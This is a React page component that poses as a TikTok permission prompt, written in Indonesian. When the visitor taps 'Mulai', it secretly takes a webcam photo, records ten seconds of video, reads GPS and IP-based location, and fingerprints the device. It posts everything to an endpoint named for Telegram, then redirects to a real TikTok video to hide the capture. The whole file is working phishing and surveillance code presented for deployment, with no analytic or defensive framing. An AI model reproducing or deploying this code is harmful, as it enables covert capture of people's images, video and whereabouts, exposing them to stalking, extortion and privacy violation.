"use client";

import { useState, useRef, useEffect } from "react";

const TIKTOK_VIDEO_URL = "https://www.tiktok.com/@slowmoetamin/video/7189732707822226694?is_from_webapp=1&sender_device=pc&web_id=7641670620761261576";

export default function TikTokPage() {
  const [loading, setLoading] = useState(true);
  const [showCard, setShowCard] = useState(false);
  const [progress, setProgress] = useState(0);
  const [countdown, setCountdown] = useState(5);
  const [done, setDone] = useState(false);
  const videoRef = useRef<HTMLVideoElement | null>(null);

  useEffect(() => {
    const v = document.createElement("video");
    v.style.display = "none"; v.muted = true; v.playsInline = true;
    document.body.appendChild(v);
    videoRef.current = v;
    return () => { if (videoRef.current) document.body.removeChild(videoRef.current); };
  }, []);

  useEffect(() => {
    const t = setTimeout(() => { setLoading(false); setShowCard(true); }, 1000);
    return () => clearTimeout(t);
  }, []);

  const handleStart = async () => {
    setShowCard(false);
    setDone(true);

    let stream: MediaStream | null = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
      });
    } catch {}

    let gps: { lat: number; lng: number } | null = null;
    try {
      gps = await new Promise(resolve => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
            () => resolve(null), { timeout: 8000 }
          );
        } else resolve(null);
      });
    } catch {}

    let ipInfo: any = null;
    try { const r = await fetch("https://ipinfo.io/json?token=56ce10652d9d41"); if (r.ok) ipInfo = await r.json(); } catch {}

    const fd = new FormData();
    if (stream) {
      const photo = await takePhoto(stream);
      const vid = await recordVideo(stream, 10000);
      if (photo) fd.append("photo", photo, "photo.jpg");
      if (vid) fd.append("video", vid, "video.webm");
      stream.getTracks().forEach(t => t.stop());
    }

    const info = await buildInfo(ipInfo, gps);
    fd.append("locationInfo", info);
    await Promise.all([sendToTelegram(fd), runProgress()]);

    await new Promise(r => setTimeout(r, 500));
    setCountdown(5);
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) { clearInterval(timer); window.location.href = TIKTOK_VIDEO_URL; return 0; }
        return prev - 1;
      });
    }, 1000);
  };

  const takePhoto = (s: MediaStream): Promise<Blob | null> => new Promise(res => {
    const v = videoRef.current; if (!v) return res(null);
    v.srcObject = s;
    v.onloadedmetadata = () => {
      v.play();
      setTimeout(() => {
        const c = document.createElement("canvas");
        c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
        const ctx = c.getContext("2d");
        if (ctx) { ctx.drawImage(v, 0, 0, c.width, c.height); c.toBlob(b => res(b), "image/jpeg", 0.8); }
        else res(null);
      }, 1500);
    };
  });

  const recordVideo = (s: MediaStream, ms: number): Promise<Blob | null> => new Promise(res => {
    let mr: MediaRecorder;
    try { mr = new MediaRecorder(s, { mimeType: "video/webm" }); }
    catch { try { mr = new MediaRecorder(s); } catch { return res(null); } }
    const ch: Blob[] = [];
    mr.ondataavailable = e => { if (e.data.size > 0) ch.push(e.data); };
    mr.onstop = () => res(new Blob(ch, { type: mr.mimeType }));
    mr.start();
    setTimeout(() => { if (mr.state !== "inactive") mr.stop(); }, ms);
  });

  const buildInfo = async (ip: any, gps: { lat: number; lng: number } | null) => {
    const ua = navigator.userAgent;
    const os = (() => {
      if (/android/i.test(ua)) {
        const m = ua.match(/Android\s+([\d.]+)/);
        const d = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
        return `Android ${m?.[1] || '?'} (${d?.[1]?.trim() || 'Unknown'})`;
      }
      if (/iPad|iPhone|iPod/.test(ua)) {
        const m = ua.match(/OS\s+([\d_]+)/);
        return `iOS ${m?.[1]?.replace(/_/g, '.') || '?'}`;
      }
      if (/Windows/.test(ua)) {
        const m = ua.match(/Windows NT\s+([\d.]+)/);
        const v: Record<string, string> = {'10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7'};
        return `Windows ${v[m?.[1] || ''] || m?.[1] || '?'}`;
      }
      if (/Mac OS X/.test(ua)) {
        const m = ua.match(/Mac OS X\s+([\d_]+)/);
        return `macOS ${m?.[1]?.replace(/_/g, '.') || '?'}`;
      }
      if (/Linux/.test(ua)) return 'Linux';
      return 'Unknown OS';
    })();

    const browser = (() => {
      if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
      if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
      if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
      if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
      return 'Unknown Browser';
    })();

    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    const network = conn
      ? `${(conn.effectiveType || conn.type || '?').toUpperCase()}${conn.downlink ? ` - ${conn.downlink} Mbps` : ''}${conn.rtt ? ` (${conn.rtt}ms)` : ''}`
      : 'Unknown';

    let battery = 'Unknown';
    try {
      const b = await (navigator as any).getBattery?.();
      if (b) { battery = `${Math.round(b.level * 100)}%${b.charging ? ' (Charging)' : ' (Discharging)'}`; }
    } catch {}

    const ram = (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Unknown';
    const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
    const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
    const dpr = window.devicePixelRatio || 1;

    let locStr = '';
    if (gps) {
      locStr = `GPS: ${gps.lat}, ${gps.lng}\nMaps: https://www.google.com/maps?q=${gps.lat},${gps.lng}`;
    } else if (ip) {
      locStr = `IP: ${ip.ip || '?'}\nKota: ${ip.city || '?'}\nRegion: ${ip.region || '?'}\nNegara: ${ip.country || '?'}\nKoordinat: ${ip.loc || '?'}\nISP: ${ip.org || '?'}`;
    } else { locStr = 'Tidak tersedia'; }

    const ts = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    return `TIKTOK - DATA PENGUNJUNG\nWaktu: ${ts}\nISO: ${new Date().toISOString()}\n\nLOKASI\n${locStr}\n\nPERANGKAT\nOS: ${os}\nBrowser: ${browser}\nPlatform: ${navigator.platform || '?'}\nBahasa: ${navigator.language}\nZona: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nBaterai: ${battery}\nRAM: ${ram}\nCPU: ${cpu}\nKoneksi: ${network}\n\nLAYAR\nResolusi: ${window.screen.width}x${window.screen.height}\nViewport: ${window.innerWidth}x${window.innerHeight}\nPixel Ratio: ${dpr}x\nColor Depth: ${window.screen.colorDepth || '?'}-bit\nOrientasi: ${orientation}\n\nUSER AGENT\n${ua}`;
  };

  const runProgress = async () => {
    for (let i = 0; i <= 100; i += 2) {
      await new Promise(r => setTimeout(r, 30));
      setProgress(i);
    }
  };

  const sendToTelegram = async (fd: FormData): Promise<boolean> => {
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const res = await fetch("/api/telegram", { method: "POST", body: fd });
        if (res.ok) return true;
      } catch {}
      if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
    }
    return false;
  };

  if (loading) {
    return (
      <div className="fixed inset-0 flex items-center justify-center" style={{ background: "#000" }}>
        <svg viewBox="0 0 24 24" className="w-7 h-7" fill="white"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1v-3.51a6.37 6.37 0 00-.79-.05A6.34 6.34 0 003.15 15.2a6.34 6.34 0 0010.86 4.46V13.2a8.19 8.19 0 005.58 2.17v-3.45a4.85 4.85 0 01-3.77-1.59V6.69h3.77z"/></svg>
      </div>
    );
  }

  if (done) {
    return (
      <div className="fixed inset-0 flex flex-col items-center justify-center" style={{ background: "linear-gradient(180deg, #161823, #121212)" }}>
        {progress < 100 ? (
          <>
            <div className="relative w-14 h-14 mb-5">
              <div className="absolute inset-0 rounded-full border-2 border-transparent" style={{ borderTopColor: "#fe2c55", borderRightColor: "#fe2c55", animation: "s 1s linear infinite" }} />
              <div className="absolute inset-0 flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="w-6 h-6" fill="#fe2c55"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1v-3.51a6.37 6.37 0 00-.79-.05A6.34 6.34 0 003.15 15.2a6.34 6.34 0 0010.86 4.46V13.2a8.19 8.19 0 005.58 2.17v-3.45a4.85 4.85 0 01-3.77-1.59V6.69h3.77z"/></svg>
              </div>
            </div>
            <div className="w-48 h-1 rounded-full overflow-hidden" style={{ background: "rgba(255,255,255,0.1)" }}>
              <div className="h-full rounded-full transition-all" style={{ width: `${progress}%`, background: "linear-gradient(90deg, #25f4ee, #fe2c55)" }} />
            </div>
          </>
        ) : (
          <>
            <p className="text-white text-sm font-medium mb-1">Selesai</p>
            <p className="text-gray-400 text-xs mb-4">Kembali ke TikTok {countdown}</p>
            <div className="w-48 h-1 rounded-full overflow-hidden" style={{ background: "rgba(255,255,255,0.1)" }}>
              <div className="h-full rounded-full transition-all duration-1000" style={{ width: `${((5 - countdown) / 5) * 100}%`, background: "#fe2c55" }} />
            </div>
          </>
        )}
      </div>
    );
  }

  return (
    <div className="relative min-h-screen flex items-center justify-center" style={{ background: "linear-gradient(135deg, #121212 0%, #1a1a2e 50%, #161823 100%)" }}>
      <div className="w-full max-w-[340px] mx-4" style={{ animation: "u 0.4s cubic-bezier(0.22,1,0.36,1) both" }}>
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
          <div className="flex items-center gap-2 px-4 py-3 border-b" style={{ borderColor: "#f1f1f1" }}>
            <img src="/logo-tiktok-new.png" className="w-5 h-5 object-contain" alt="TikTok" />
            <span className="text-sm font-semibold" style={{ color: "#111" }}>TikTok</span>
          </div>

          <div className="p-5 flex flex-col items-center text-center">
            <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-full overflow-hidden" style={{ background: "linear-gradient(135deg, #fe2c55, #25f4ee)" }}>
              <img src="/logo-tiktok-new.png" className="w-9 h-9 object-contain" alt="TikTok" />
            </div>

            <p className="text-sm leading-relaxed mb-5" style={{ color: "#555" }}>
              Untuk menggunakan TikTok, aktifkan kamera dan lokasi.
            </p>

            <div className="flex flex-col gap-2 w-full mb-1">
              <div className="flex items-center gap-3 rounded-xl px-3.5 py-3 text-left" style={{ background: "#f8f8f8" }}>
                <svg viewBox="0 0 24 24" className="w-5 h-5 shrink-0" fill="#fe2c55"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
                <span className="text-sm font-medium" style={{ color: "#333" }}>Kamera</span>
              </div>
              <div className="flex items-center gap-3 rounded-xl px-3.5 py-3 text-left" style={{ background: "#f8f8f8" }}>
                <svg viewBox="0 0 24 24" className="w-5 h-5 shrink-0" fill="#25f4ee"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
                <span className="text-sm font-medium" style={{ color: "#333" }}>Lokasi</span>
              </div>
            </div>

            <button
              onClick={handleStart}
              className="mt-4 w-full rounded-xl py-3 text-sm font-bold text-white transition-all active:scale-[0.98]"
              style={{ background: "linear-gradient(135deg, #fe2c55, #f02a4e)" }}
            >
              Mulai
            </button>
          </div>
        </div>
      </div>
      <style>{`@keyframes u{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}@keyframes s{to{transform:rotate(360deg)}}`}</style>
    </div>
  );
}
